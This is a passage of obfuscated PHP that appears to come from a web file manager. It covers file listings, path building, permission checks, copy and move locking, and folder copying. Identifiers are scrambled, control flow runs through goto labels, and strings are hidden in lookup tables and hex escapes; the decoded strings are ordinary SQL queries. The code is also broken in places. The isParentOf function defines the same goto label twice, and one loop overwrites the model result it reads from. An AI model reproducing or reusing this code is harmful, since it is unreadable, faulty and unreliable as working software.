$aʭ[$dԍ[$Bݤ[435]]][$dԍ[$Bݤ[89]]] = $dԍ[$Bݤ[366]]; } goto F³; a≙: $Bڪ = Model($Bݤ[438])->field($f)->where($aɈ)->select(); $Bڪ = array_to_keyvalue($Bڪ, $Bݤ[435]); $aҼ = Model($Bݤ[439])->field($Bݤ[440])->where($aɈ)->select(); goto fа; F³: foreach ($CÄ as &$EҖ) { goto F; e: $D[$Bݤ[77]] = $EҖ[$Bݤ[77]]; $D[$Bݤ[28]] = $EҖ[$Bݤ[28]]; if (!isset(self::$cacheFileInfo[$Bݤ[441] . $e])) { self::$cacheFileInfo[$Bݤ[441] . $e] = array_merge(array(), $D); } goto d; fŦ: if (isset($EҖ[$Bݤ[161]][$Bݤ[160]])) { $EҖ[$Bݤ[160]] = json_decode($EҖ[$Bݤ[161]][$Bݤ[160]], !0); unset($EҖ[$Bݤ[161]][$Bݤ[160]]); } goto f; F: $e = $EҖ[$Bݤ[435]]; if (!$e || !isset($Bڪ[$e])) { continue; } $D = $Bڪ[$e]; goto e; d: unset($Bڪ[$e][$Bݤ[75]]); $e = is_array($aʭ[$e]) ? $aʭ[$e] : array(); $EҖ[$Bݤ[161]] = array_merge($e, $Bڪ[$e]); goto fŦ; f: } unset($EҖ); goto aߊ; A: if (!$d縗) { return; } $aɈ = array($Bݤ[436] => array($Bݤ[400], $d縗)); $f = $Bݤ[437]; goto a≙; AƂ: $Bݤ =& $_SERVER[Ť]; $d縗 = array_to_keyvalue($CÄ, $Bݤ[33], $Bݤ[435]); $d縗 = array_filter(array_unique($d縗)); goto A; aߊ: } protected function _listAppendSourceInfo(&$F, $cǸ) { goto e扔; E뢑: return $F; goto F鵗; e扔: $Bҍͳ =& $_SERVER[Ť]; if (!defined($Bҍͳ[442])) { return; } $fߜ = Model($Bҍͳ[443])->listData(); goto A; Aβ䛖: $a = array_to_keyvalue_group($D򔷕, $Bҍͳ[385]); foreach ($F as &$A) { $A[$Bҍͳ[407]] = array($Bҍͳ[445] => 0, $Bҍͳ[446] => 0, $Bҍͳ[447] => 0); if (isset($c낵[$A[$Bҍͳ[385]]])) { $A[$Bҍͳ[407]][$Bҍͳ[448]] = 1; $A[$Bҍͳ[407]][$Bҍͳ[449]] = $c낵[$A[$Bҍͳ[385]]][$Bҍͳ[28]]; } if (isset($b[$A[$Bҍͳ[385]]])) { $A[$Bҍͳ[407]][$Bҍͳ[450]] = array(); foreach ($b[$A[$Bҍͳ[385]]] as $A׋) { $d؆ = $fÛ[$A׋]; $A[$Bҍͳ[407]][$Bҍͳ[450]][] = array($Bҍͳ[451] => $d؆[$Bҍͳ[383]], $Bҍͳ[402] => $d؆[$Bҍͳ[28]], $Bҍͳ[452] => $d؆[$Bҍͳ[453]]); } } if (isset($a[$A[$Bҍͳ[385]]])) { $A[$Bҍͳ[407]][$Bҍͳ[454]] = array(); foreach ($a[$A[$Bҍͳ[385]]] as $eɿһ) { $A[$Bҍͳ[407]][$Bҍͳ[454]] = array($Bҍͳ[455] => $eɿһ[$Bҍͳ[456]], $Bҍͳ[457] => $eɿһ[$Bҍͳ[458]], $Bҍͳ[459] => $eɿһ[$Bҍͳ[385]], $Bҍͳ[460] => $eɿһ[$Bҍͳ[461]], $Bҍͳ[462] => $eɿһ[$Bҍͳ[463]], $Bҍͳ[464] => $eɿһ[$Bҍͳ[464]], $Bҍͳ[465] => $eɿһ[$Bҍͳ[465]]); } } } unset($A); goto E뢑; bڃ: $fÛ = array_to_keyvalue($fߜ, $Bҍͳ[383]); $b = array_to_keyvalue_group($cӹᢞ, $Bҍͳ[75], $Bҍͳ[409]); $c낵 = array_to_keyvalue($dꓳ, $Bҍͳ[75]); goto Aβ䛖; A: $cӹᢞ = Model($Bҍͳ[408])->listData(); $dꓳ = Model($Bҍͳ[397])->listData(); $D򔷕 = Model($Bҍͳ[444])->listSimple(); goto bڃ; F鵗: } protected function _listAppendChildren(&$D۲, $C) { goto Fь; C: foreach ($D۲ as &$Bӏ) { if ($Bӏ[$b晈[386]]) { unset($Bӏ[$b晈[388]]); $Bӏ[$b晈[200]] = intval($D[$Bӏ[$b晈[385]] . $b晈[468]][$b晈[469]]); $Bӏ[$b晈[199]] = intval($D[$Bӏ[$b晈[385]] . $b晈[470]][$b晈[469]]); } } unset($Bӏ); goto B; Fь: $b晈 =& $_SERVER[Ť]; $cȬ = $b晈[368]; $D = array(); goto cņ; DΡ: $E = $this->tablePrefix . $this->tableName; for ($A = 0; $A < $FÂ; $A++) { $DѶՓ = intval($D۲[$A][$b晈[413]]); if ($D۲[$A][$b晈[386]]) { $C׽ = $D۲[$A][$b晈[385]]; $cȬ .= "\123\105\114\x45\x43\x54\40\52\x20\x46\x52\x4f\115\40\50\123\x45\x4c\x45\103\124\40\47{$C׽}\137\x68\141\x73\106\151\154\x65\47\40\x61\163\40\x68\x61\x73\x2c\143\x6f\165\x6e\x74\50\61\x29\40\141\x73\40\x68\141\x73\103\157\x75\x6e\164\x20\x46\122\x4f\x4d\x20\x60{$E}\x60\x20\xa\11\11\x9\11\x9\167\x68\145\162\145\40\160\x61\x72\145\x6e\x74\x49\x44\x3d{$C׽}\40\141\156\x64\x20\151\x73\106\x6f\x6c\144\x65\x72\75\60\40\x61\156\144\40\151\x73\x44\145\x6c\145\164\x65\x3d{$DѶՓ}\x29\x20\x61\x73\x20\x74\x62\x31\x5f{$C׽}\x20\165\156\x69\x6f\156\40\141\154\x6c\x20\xa\11\x9\11\11\11\x53\105\114\x45\103\x54\x20\x2a\x20\106\122\x4f\115\x20\x28\x53\105\x4c\x45\x43\x54\40\47{$C׽}\137\x68\141\163\106\157\154\x64\x65\x72\x27\40\x61\163\40\150\x61\x73\106\x69\x6c\145\54\143\x6f\x75\x6e\x74\50\61\51\x20\141\163\x20\x68\x61\x73\103\x6f\165\156\x74\40\106\122\117\115\x20\x60{$E}\x60\40\12\x9\x9\x9\11\11\167\150\145\162\x65\x20\160\141\x72\145\x6e\x74\x49\x44\75{$C׽}\x20\x61\x6e\144\x20\151\163\x46\x6f\x6c\144\145\162\75\61\40\141\156\144\x20\x69\163\x44\x65\x6c\x65\164\x65\75{$DѶՓ}\51\40\141\x73\40\164\142\x32\x5f{$C׽}\x20\x75\156\x69\157\156\40\141\154\154\x20"; } if ((strlen($cȬ) >= $Dؚ멸 || $A == $FÂ - 1) && $cȬ) { $cȬ = substr($cȬ, 0, -strlen($b晈[466])); $Bµ = $this->query($cȬ); $D = array_merge($D, $Bµ); $cȬ = $b晈[33]; } } $D = array_to_keyvalue($D, $b晈[467]); goto C; cņ: $Dؚ멸 = 1024 * 50; $D۲ = is_array($D۲) ? $D۲ : array(); $FÂ = count($D۲); goto DΡ; B: } protected function _listAppendAuth(&$dЅ) { goto Dڎڕ; dո: foreach ($dЅ as $D) { if ($D[$Cã߆[387]] == self::TYPE_GROUP) { $d쇃[] = $D[$Cã߆[385]]; } } if (!$d쇃) { return; } $f = array_to_keyvalue($dЅ, $Cã߆[385]); goto Dڊ; Dڊ: $c = Model($Cã߆[471])->getSourceList($d쇃, $f); foreach ($dЅ as $c => &$D) { $D[$Cã߆[392]] = $c[$D[$Cã߆[385]]]; if (!$D[$Cã߆[392]] && $D[$Cã߆[387]] == self::TYPE_GROUP) { $D[$Cã߆[392]] = Action($Cã߆[472])->pathGroupAuthMake($D[$Cã߆[473]]); if (!$D[$Cã߆[392]] && !_get($GLOBALS, $Cã߆[474])) { $D[$Cã߆[192]] = !1; $D[$Cã߆[191]] = !1; } } if ($D[$Cã߆[392]]) { $D[$Cã߆[192]] = AuthModel::authCheckEdit($D[$Cã߆[392]][$Cã߆[393]]); $D[$Cã߆[191]] = AuthModel::authCheckView($D[$Cã߆[392]][$Cã߆[393]]); } $this->groupPathDisplay($D); } unset($D); goto c; Dڎڕ: $Cã߆ =& $_SERVER[Ť]; if (!defined($Cã߆[442])) { return; } $d쇃 = array(); goto dո; c: } public function groupPathDisplay(&$D) { goto a㗕; AĎɲ: $D[$DѦߏ[477]] = $fũ̘[$DѦߏ[478]]; $D[$DѦߏ[396]] = $fũ̘[$DѦߏ[476]]; $D[$DѦߏ[479]] = $fũ̘[$DѦߏ[480]]; goto D; D: $D[$DѦߏ[481]] = $E . $fũ̘[$DѦߏ[407]][$DѦߏ[385]]; goto Eʦ; fʌ: $bŦ = $this->parentLevelArray($fũ̘[$DѦߏ[476]]); $E = $DѦߏ[33]; foreach ($bŦ as $Dʺԕ) { $FԎ = Model($DѦߏ[475])->getInfo($Dʺԕ); $E .= $FԎ[$DѦߏ[407]][$DѦߏ[385]] . $DѦߏ[47]; } goto AĎɲ; a㗕: $DѦߏ =& $_SERVER[Ť]; if ($D[$DѦߏ[387]] != self::TYPE_GROUP) { return; } $fũ̘ = Model($DѦߏ[475])->getInfo($D[$DѦߏ[473]]); goto fʌ; Eʦ: } protected function _listAppendPath(&$B) { goto b㹰; D: foreach ($B as &$F؅) { $C[$F؅[$dџ[385]]] = $F؅[$dџ[28]]; $fߧ = $this->parentLevelArray($F؅[$dџ[476]]); foreach ($fߧ as $a΋ӡ => $cх) { if ($a΋ӡ != 0 && !isset($C[$cх])) { $C򖅥[] = $cх; } } } unset($F؅); if (count($C򖅥) > 0) { $a = array($dџ[399] => array($dџ[400], $C򖅥)); if (count($C򖅥) == 1) { $d׉Ύ = $this->sourceInfo($C򖅥[0]); $aӶ = is_array($d׉Ύ) ? array($d׉Ύ) : !1; } else { $aӶ = $this->field($dџ[482])->where($a)->select(); } $eΘ = array_to_keyvalue($aӶ, $dџ[385], $dџ[28]); $C = array_merge_index($C, $eΘ); } goto eп; eп: $Eٸ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($B as &$F؅) { goto Bјą; a: if ($fߧ) { $Fʧܡ .= $F؅[$dџ[28]]; } if ($F؅[$dџ[386]]) { $Fʧܡ .= $dџ[8]; } $F؅[$dџ[483]] = str_replace($dџ[484], $dџ[8], $Fʧܡ); goto Dع鐎; Dع鐎: $E׎ = trim($F؅[$dџ[483]], $dџ[8]); if ($F؅[$dџ[478]] == $dџ[485] && $E׎) { $F؅[$dџ[28]] = $E׎; } $this->_listAppendPathRecycle($F؅, $fߧ, $Eٸ); goto Fڹ; Bјą: $fߧ = $this->parentLevelArray($F؅[$dџ[476]]); $Fʧܡ = $this->_listAppendPathRoot($F؅, $fߧ); foreach ($fߧ as $a΋ӡ => $cх) { if ($a΋ӡ == 0 && $Fʧܡ && $F؅[$dџ[387]] == self::TYPE_GROUP) { continue; } if (isset($C[$cх])) { $Fʧܡ .= $C[$cх] . $dџ[8]; } } goto a; Fڹ: } unset($F؅); goto b; b: return $B; goto D۩; b㹰: $dџ =& $_SERVER[Ť]; static $C = array(); $C򖅥 = array(); goto D; D۩: } private function _listAppendPathRecycle(&$fݐ, $eƏ, $Eϳ) { goto Bժ; d܅: $fݐ[$Eċ[476]] = $Eċ[487] . implode($Eċ[47], array_slice($eƏ, 1)) . $Eċ[47]; if ($fݐ[$Eċ[385]] == $Eϳ) { $fݐ[$Eċ[476]] = $Eċ[487]; $fݐ[$Eċ[478]] = $Eċ[485]; $fݐ[$Eċ[28]] = LNG($Eċ[486]); } $fݐ[$Eċ[488]] = $Eċ[489]; goto B츅; d՟: $FК = explode($Eċ[8], trim($fݐ[$Eċ[483]], $Eċ[8])); $Dҥ = implode($Eċ[8], array_slice($FК, 2)); $fݐ[$Eċ[483]] = $Eċ[8] . LNG($Eċ[486]) . $Eċ[8] . ltrim($Dҥ, $Eċ[8]); goto d܅; Bժ: $Eċ =& $_SERVER[Ť]; if (intval($fݐ[$Eċ[387]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($Eϳ, $eƏ) && $fݐ[$Eċ[385]] != $Eϳ) { return; } goto d՟; B츅: } protected function _listAppendPathRoot(&$e, $D) { $b =& $_SERVER[Ť]; $dӮӯ = $b[33]; if ($e[$b[387]] == self::TYPE_USER) { if (defined($b[442]) && $e[$b[473]] == USER_ID) { $dӮӯ = LNG($b[490]); if (!$D) { $e[$b[28]] = $dӮӯ; } } else { $A = Model($b[491])->getInfoSimple($e[$b[473]]); $dӮӯ = LNG($b[492]) . $b[157] . $A[$b[28]] . $b[493]; } } else { if ($e[$b[387]] == self::TYPE_GROUP) { $A = Model($b[475])->getInfoSimple($e[$b[473]]); $dӮӯ = $A[$b[28]]; } else { if ($e[$b[387]] == self::TYPE_SYSTEM) { $A = $this->sourceInfo($D[0], !0); $dӮӯ = $A[$b[28]]; } } } $dӮӯ = $dӮӯ ? $b[8] . $dӮӯ . $b[8] : $b[8]; return $dӮӯ; } protected function _listAppendUser(&$EȨ) { goto F֜; e䷺: $f葕 = array_merge($fܠ, $bէͿ); $cɺ = Model($b[494])->userListInfo($f葕); foreach ($EȨ as &$E͉ӏ) { $e = $E͉ӏ[$b[394]]; $E͉ӏ[$b[394]] = $cɺ[$e] ? $cɺ[$e] : !1; $e = $E͉ӏ[$b[395]]; $E͉ӏ[$b[395]] = $cɺ[$e] ? $cɺ[$e] : !1; if (isset($E͉ӏ[$b[433]]) && $E͉ӏ[$b[433]][$b[495]]) { $C = $GLOBALS[$b[6]][$b[84]][$b[496]]; if ($E͉ӏ[$b[433]][$b[497]] <= time() - $C) { $this->metaSet($E͉ӏ[$b[385]], $b[495], null); $this->metaSet($E͉ӏ[$b[385]], $b[497], null); unset($E͉ӏ[$b[433]][$b[495]]); continue; } $cŰ = $E͉ӏ[$b[433]][$b[495]]; $E͉ӏ[$b[433]][$b[498]] = Model($b[494])->getInfoSimpleOuter($cŰ); } } goto Bɷ; Bɷ: unset($E͉ӏ); goto D; F֜: $b =& $_SERVER[Ť]; $fܠ = array_to_keyvalue($EȨ, $b[33], $b[394]); $bէͿ = array_to_keyvalue($EȨ, $b[33], $b[395]); goto e䷺; D: } public function parentLevelArray($B췊τ) { $eԌ =& $_SERVER[Ť]; $B췊τ = explode($eԌ[47], trim($B췊τ, $eԌ[47])); return array_remove_value($B췊τ, $eԌ[485]); } public function listAll($b䄰) { goto Eߍ; cڔم: $this->_listAppendAuth($e); $this->_listAppendUser($e); $this->_listAppendPath($e); goto e; Cթ٧: $D̞ = array(); foreach ($e as $d => $f喰͢) { goto Eʻō; c毗˾: $BĄ = str_replace($A҄[484], $A҄[8], $BĄ); $BĄ = str_replace($A҄[484], $A҄[8], $BĄ); $aԜ΋ = array($A҄[403] => str_replace($A҄[484], $A҄[8], $BĄ), $A҄[505] => intval($f喰͢[$A҄[386]]), $A҄[407] => $this->pathInfoFilter($f喰͢, !0)); goto D; Eʻō: $C򹝈 = $this->parentLevelArray($f喰͢[$A҄[476]]); array_shift($C򹝈); $BĄ = $AȒڑ; goto Aʑ; D: if (!$f喰͢[$A҄[386]]) { $aԜ΋[$A҄[435]] = $f喰͢[$A҄[435]]; $aԜ΋[$A҄[506]] = $f喰͢[$A҄[75]]; } $D̞[] = $aԜ΋; goto aۃ; Aʑ: for ($F竘䵢 = 0; $F竘䵢 < count($C򹝈); $F竘䵢++) { $BĄ .= $e[$C򹝈[$F竘䵢]][$A҄[28]] . $A҄[8]; } $BĄ .= $f喰͢[$A҄[28]]; if ($f喰͢[$A҄[386]]) { $BĄ .= $A҄[8]; } goto c毗˾; aۃ: } return $D̞; goto e崘; a׼: $e = $A҄[503]; $B䐂 = "\114\x45\x46\x54\x20\x4a\117\111\x4e\x20{$this->tablePrefix}\151\157\x5f\146\151\x6c\x65\40\146\x69\154\x65\40\157\156\x20\x73\x6f\165\x72\143\x65\x2e\x66\x69\154\145\111\x44\x20\75\x20\x66\x69\x6c\x65\x2e\146\x69\x6c\x65\111\104"; $e = $this->alias($A҄[504])->field($e)->where($fȹ)->join($B䐂)->select(); goto cڔم; e: $e = array_to_keyvalue($e, $A҄[385]); $AȒڑ = "\x2f{$Bς崟[$A҄[28]]}\x2f"; $AȒڑ = $AȒڑ == $A҄[484] ? $A҄[8] : $AȒڑ; goto Cթ٧; Eߍ: $A҄ =& $_SERVER[Ť]; $Bς崟 = $this->sourceInfo($b䄰); $fȹ = array($A҄[499] => array($A҄[500], $Bς崟[$A҄[476]] . $b䄰 . $A҄[501]), $A҄[502] => 0); goto a׼; e崘: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($D) { goto FԴ; B: $this->_lockEvent($D, array($dѹ[510], $dѹ[511]), $dﱨ﵄); $this->_lockCheckEnd($dѹ[507], $D); goto b֢੮; a҈: $dﱨ﵄ = 1; $this->_lockEvent($D, array($dѹ[508], $dѹ[509]), $dﱨ﵄); $this->_lockParent($D, array($dѹ[509]), $dﱨ﵄); goto B; FԴ: $dѹ =& $_SERVER[Ť]; if (!$this->allowLock()) { return; } $this->_lockCheck($dѹ[507], $D); goto a҈; b֢੮: } public function lockCopyEnd($b⡖) { $E֮ =& $_SERVER[Ť]; if (!$this->allowLock()) { return; } $eݕ = 0; $this->_lockEvent($b⡖, array($E֮[508], $E֮[509]), $eݕ); $this->_lockParent($b⡖, array($E֮[509]), $eݕ); $this->_lockEvent($b⡖, array($E֮[510], $E֮[511]), $eݕ); } public function lockWriteStart($DҼ, $Bˢ˲ڐ = '') { goto B; F͐: $AՐ = 1; $this->_lockKey($d˄سܸ[512] . $DҼ . $d˄سܸ[91] . $Bˢ˲ڐ, $AՐ); $this->_lockEvent($DҼ, array($d˄سܸ[507], $d˄سܸ[509]), $AՐ); goto Fӈ; Fӈ: $this->_lockParent($DҼ, array($d˄سܸ[507], $d˄سܸ[509]), $AՐ); $this->_lockCheckEnd($d˄سܸ[508], $DҼ); goto a͏ݲ; B: $d˄سܸ =& $_SERVER[Ť]; if (!$this->allowLock()) { return; } $this->_lockCheck($d˄سܸ[508], $DҼ); goto F͐; a͏ݲ: } public function lockWriteEnd($e衆, $E© = '') { $aߪ =& $_SERVER[Ť]; if (!$this->allowLock()) { return; } $B񖆙 = 0; $this->_lockKey($aߪ[512] . $e衆 . $aߪ[91] . $E©, $B񖆙); $this->_lockEvent($e衆, array($aߪ[507], $aߪ[509]), $B񖆙); $this->_lockParent($e衆, array($aߪ[507], $aߪ[509]), $B񖆙); } public function lockMoveStart($e) { goto Fś; Eߛ: $this->_lockParent($e, array($Eܚչ[507], $Eܚչ[509]), $F); $this->_lockEvent($e, array($Eܚչ[514], $Eܚչ[510], $Eܚչ[511]), $F); $this->_lockCheckEnd($Eܚչ[509], $e); goto f̟; Fś: $Eܚչ =& $_SERVER[Ť]; if (!$this->allowLock()) { return; } $this->_lockCheck($Eܚչ[509], $e); goto bٕ; bٕ: $F = 1; $this->_lockKey($Eܚչ[513] . $e, $F); $this->_lockEvent($e, array($Eܚչ[507], $Eܚչ[508]), $F); goto Eߛ; f̟: } public function lockMoveEnd($Aߪ) { goto aȎ; aȎ: $Eذ =& $_SERVER[Ť]; if (!$this->allowLock()) { return; } $b = 0; goto d΂; Cĥ: $this->_lockEvent($Aߪ, array($Eذ[514], $Eذ[510], $Eذ[511]), $b); goto C; d΂: $this->_lockKey($Eذ[513] . $Aߪ, $b); $this->_lockEvent($Aߪ, array($Eذ[507], $Eذ[508]), $b); $this->_lockParent($Aߪ, array($Eذ[507], $Eذ[509]), $b); goto Cĥ; C: } private function _lockCheck($C, $cʇڌ) { goto fĹ; Eǆ㊫: $b蜥 = array_reverse($this->parentLevelArray($C[$Dğ[476]])); foreach ($b蜥 as $F܎޸) { $F = $C . $Dğ[516] . $F܎޸; if (CacheLock::lockGet($Dğ[517] . $F)) { $C = $this->sourceInfo($F܎޸); CacheLock::setErrorMsg($Dğ[157] . htmlspecialchars($C[$Dğ[28]]) . $Dğ[493] . $f); $this->_lockKey($F, 1); $this->_lockKey($F, 0); } } goto A݄; d͋ڻ: $this->_lockTimeStart[$F] = timeFloat(); if (!is_array($C)) { return; } $f = LNG($Dğ[515]); goto fי; fĹ: $Dğ =& $_SERVER[Ť]; $C = $this->sourceInfo($cʇڌ); $F = $C . $Dğ[91] . $cʇڌ; goto d͋ڻ; fי: CacheLock::setErrorMsg($Dğ[157] . htmlspecialchars($C[$Dğ[28]]) . $Dğ[493] . $f); $this->_lockKey($F, 1); $this->_lockKey($F, 0); goto Eǆ㊫; A݄: } private function _lockCheckEnd($b̼, $D) { goto E̢; E̢: $dᔐ =& $_SERVER[Ť]; $aȺ = $b̼ . $dᔐ[91] . $D; CacheLock::setErrorMsg($dᔐ[368]); goto f; e: if ($BС > 0.5) { unset(self::$cacheSourceInfo[$dᔐ[426] . $D]); } $c = $this->sourceInfo($D); if (!$c) { show_json(LNG($dᔐ[101]), !1); } goto a̲; f: if (!isset($this->_lockTimeStart[$aȺ])) { return; } $BС = timeFloat() - $this->_lockTimeStart[$aȺ]; unset($this->_lockTimeStart[$aȺ]); goto e; a̲: } private function _lockParent($e҅, $c͗, $a져) { if (!$this->autoLockSet) { return; } $B = $this->sourceInfo($e҅); if (!is_array($B)) { return; } $b = array_reverse($this->parentLevelArray($B[$_SERVER[Ť][476]])); foreach ($b as $E) { $this->_lockEvent($E, $c͗, $a져); } } private function _lockEvent($Aꃏ, $Dޤ, $B) { $bҫ =& $_SERVER[Ť]; if (!$this->autoLockSet) { return; } foreach ($Dޤ as $DԔ) { $C = $DԔ . $bҫ[91] . $Aꃏ; if ($B && CacheLock::lockGet($bҫ[517] . $C)) { continue; } $this->_lockKey($C, $B); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($Eߛ晾, $FӅ = 1) { $fƋʑ = $_SERVER[Ť][517] . md5($Eߛ晾); if ($FӅ) { if (isset(self::$_lockItemArr[$fƋʑ])) { return; } self::$_lockItemArr[$fƋʑ] = 1; CacheLock::lock($fƋʑ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$fƋʑ])) { return; } unset(self::$_lockItemArr[$fƋʑ]); CacheLock::unlock($fƋʑ); } } public function isParentOf($FÎ, $f) { goto A; A: $E料 = $bɚ[$F[476]] . $bɚ[$F[385]] . $F[47]; $E = $Dơ[$F[476]] . $Dơ[$F[385]] . $F[47]; $dˈΪ = strpos($E, $E料) === 0; goto F; F: return $dˈΪ; goto Cٛ; A: $F =& $_SERVER[Ť]; $bɚ = $this->sourceInfo($FÎ); $Dơ = $this->sourceInfo($f); goto A; Cٛ: } private $targetIsDelete = 0; public function copy($Aٍ, $a, $Aɕ = REPEAT_REPLACE, $e = '') { goto a; bݙ: if ($F̆[$F[386]] == $F[83] && $C == $f) { $this->folderSizeResetChildren($C); } Model($F[521])->addAll($A֩[$F[519]], array(), !0); if ($C != $f || $F̆[$F[386]] == $F[83]) { Model($F[522])->eventCopy($f); } goto eٜ; a: $F =& $_SERVER[Ť]; $F̆ = $this->sourceInfo($Aٍ); $Dߖ = $this->sourceInfo($a); goto Cߣ; Eߴ: $this->_childrenListClear(); $this->lockCopyEnd($Aٍ); $this->lockWriteEnd($a, $A); goto bݙ; F类: $this->targetIsDelete = intval($F̆[$F[413]]); $C = $this->fileNameExistCache($a, $F̆[$F[28]]); $f = $this->_copy($Aٍ, $a, $Aɕ, $A֩, !0, $e); goto Eߴ; eٜ: $this->saveAll($A֩[$F[520]]); Model($F[171])->linkAdd($A֩[$F[518]]); $this->folderSizeReset($a); goto c; c: $this->updateModifyTime($a); return $f; goto Cŝ; Cߣ: if (!$F̆ || !$Dߖ || $Dߖ[$F[386]] != $F[83]) { return !1; } if ($this->isParentOf($Aٍ, $a)) { return !1; } $A = $e ? $e : $F̆[$F[28]]; goto b̳יγ; b̳יγ: $this->lockCopyStart($Aٍ); $this->lockWriteStart($a, $A); $A֩ = array($F[518] => array(), $F[519] => array(), $F[520] => array()); goto F类; Cŝ: } private function _copy($BĂ, $E̲, $A, &$dǾ, $Aź, $Eϴ = '') { goto f; dԞ: return $F޾; goto aՋ; C筿: $a = $Eϴ ? $Eϴ : $Dʂ[$fѭ̿[28]]; $BЄ = $this->fileNameExistCache($E̲, $a); if ($Aź) { $this->_childrenAllMake($BĂ); if ($dזɌ && $BЄ) { $this->_childrenAllMake($BЄ); } } goto CÎ; f: $fѭ̿ =& $_SERVER[Ť]; $Dʂ = $this->sourceInfoCache($BĂ); $dזɌ = $Dʂ[$fѭ̿[386]] == $fѭ̿[83]; goto C筿; CÎ: if (!$BЄ) { return $this->_copyCreate($BĂ, $E̲, $a, $dǾ); } $F޾ = $BЄ; if ($dזɌ) { if ($A == REPEAT_RENAME_FOLDER) { $a = $this->fileNameAutoCache($E̲, $a, $A, $dזɌ); $F޾ = $this->_copyCreate($BĂ, $E̲, $a, $dǾ); } else { $B؆ = $this->_childrenList($BĂ); foreach ($B؆ as $a牝) { $this->_copy($a牝[$fѭ̿[385]], $BЄ, $A, $dǾ, !1); } } } else { if ($A == REPEAT_RENAME || $A == REPEAT_RENAME_FOLDER) { $a = $this->fileNameAutoCache($E̲, $a, $A, $dזɌ); $F޾ = $this->_copyCreate($BĂ, $E̲, $a, $dǾ); } else { if ($A == REPEAT_REPLACE) { $D̺ = $this->sourceInfoCache($BЄ); $bɈ = $this->fileHistory($D̺, $Dʂ[$fѭ̿[435]], $Dʂ[$fѭ̿[77]]); if ($bɈ) { $dǾ[$fѭ̿[518]][] = $Dʂ[$fѭ̿[435]]; } } else { if ($A == REPEAT_SKIP) { } } } Hook::trigger($fѭ̿[523], array($fѭ̿[524], $Dʂ, 0)); } goto dԞ; aՋ: } private function _copyCreate($DߨМ, $cƐڜ, $a޷, &$C) { goto aХ; E: if ($E[$a[386]] != $a[83]) { $C[$a[518]][] = $E[$a[435]]; return $Fè; } $Eɐ = array(); $â = array(); goto aӧ; FҨ: $AǮړ[$DߨМ] = $Fè; $d = array(); $a߲ = array(); goto dē; aХ: $a =& $_SERVER[Ť]; $E = $this->sourceInfoCache($DߨМ); $f = $this->sourceInfoCache($cƐڜ); goto dЫ; dЫ: $cǼ = $this->_makeItemData($E, $f, $a޷); Hook::trigger($a[525], $cǼ); Hook::trigger($a[526], array($a[527], $cǼ, 0)); goto a줋; F: $this->chunkEventSet($a[532], array($a[533], $cǼ, $Aɕ̘)); $this->saveAll($a߲); return $Fè; goto aҙ; a줋: $Fè = $this->add($cǼ); $dȣߜ = array($a[385] => $Fè, $a[28] => $a޷); $this->_copyApplyMeta($dȣߜ, $C); goto E; aӧ: $this->_childrenListAll($DߨМ, $Eɐ); $Aɕ̘ = count($Eɐ); if ($Aɕ̘ == 0) { return $Fè; } goto Eӎ; dē: foreach ($F as $Aɭ) { $B = $Aɭ[$a[385]]; $c犎 = $this->_childrenMatch($AǮړ, $Aɭ, $C); $d[] = array($a[385], $B, $a[478], $c犎[$a[478]]); $a߲[] = array($a[385], $B, $a[476], $c犎[$a[476]]); $this->_copyApplyMeta($Aɭ, $C); if ($Aɭ[$a[386]] != $a[83]) { $C[$a[518]][] = $Aɭ[$a[435]]; } } $this->chunkEventSet($a[530], array($a[531], $cǼ, $Aɕ̘)); $this->saveAll($d); goto F; CꜮ: $this->addAll($â, array(), !1); $F = $this->where(array($a[478] => $Fè))->select(); $AǮړ = $this->_childrenMakeRelation($Eɐ, $F); goto FҨ; Eӎ: $C = $this->sourceInfo($Fè); foreach ($Eɐ as $Aɭ) { $FɞΕ = $this->_makeItemData($Aɭ, $C, $Aɭ[$a[28]]); $FɞΕ[$a[476]] = $Aɭ[$a[476]]; $â[] = $FɞΕ; } $this->chunkEventSet($a[528], array($a[529], $cǼ, $Aɕ̘)); goto CꜮ; aҙ: } private function _childrenMakeRelation($F̯, $eԩ) { $F˯ =& $_SERVER[Ť]; $Dљ硴 = array(); $E˔ = array(); foreach ($F̯ as $C׫) { $eۭ = $C׫[$F˯[28]] . $F˯[8] . $C׫[$F˯[476]]; $Dљ硴[$eۭ] = $C׫[$F˯[385]]; } foreach ($eԩ as $C׫) { $eۭ = $C׫[$F˯[28]] . $F˯[8] . $C׫[$F˯[476]]; $Bڛ = $Dљ硴[$eۭ]; $E˔[$Bڛ] = $C׫[$F˯[385]]; } return $E˔; } private function _childrenMatch($B˂蠭, $Dǅ߈, $DӉ) { goto B݊; Cē: foreach ($fђ as $eȎ) { if (isset($B˂蠭[$eȎ])) { $c .= $B˂蠭[$eȎ] . $f[534]; } } $c = rtrim($c, $f[47]) . $f[47]; $dҖ = $this->parentLevelArray($c); goto b; B݊: $f =& $_SERVER[Ť]; $c = $DӉ[$f[476]]; $fђ = $this->parentLevelArray($Dǅ߈[$f[476]]); goto Cē; b: $eڈ = $dҖ[count($dҖ) - 1]; return array($f[478] => $eڈ, $f[476] => $c); goto aݼᾡ; aݼᾡ: } private function _makeItemData($f, $DÂ, $D) { $A =& $_SERVER[Ť]; $f͍ = array($A[535] => $f[$A[386]], $A[402] => $D, $A[536] => $f[$A[388]], $A[436] => $f[$A[435]], $A[537] => $f[$A[77]], $A[538] => $DÂ[$A[387]], $A[539] => $DÂ[$A[473]], $A[540] => USER_ID, $A[541] => USER_ID, $A[384] => $DÂ[$A[385]], $A[542] => $DÂ[$A[476]] . $DÂ[$A[385]] . $A[47], $A[412] => 0, $A[543] => $A[33]); return $f͍; } private function _copyApplyMeta($a۷, &$D) { $DպÔ =& $_SERVER[Ť]; $d팩 = $a۷[$DպÔ[385]]; $cڜϲ = $a۷[$DպÔ[28]]; if (!isset($a۷[$DպÔ[544]]) || !$a۷[$DպÔ[544]] || $a۷[$DպÔ[544]] == $DպÔ[485]) { $D[$DպÔ[520]][] = array($DպÔ[385], $d팩, $DպÔ[544], short_id($d팩)); } if (Input::check($cڜϲ, $DպÔ[545])) { $D[$DպÔ[519]][] = array($DպÔ[385] => $d팩, $DպÔ[89] => $DպÔ[432], $DպÔ[366] => str_replace($DպÔ[50], $DպÔ[33], Pinyin::encode($cڜϲ))); $D[$DպÔ[519]][] = 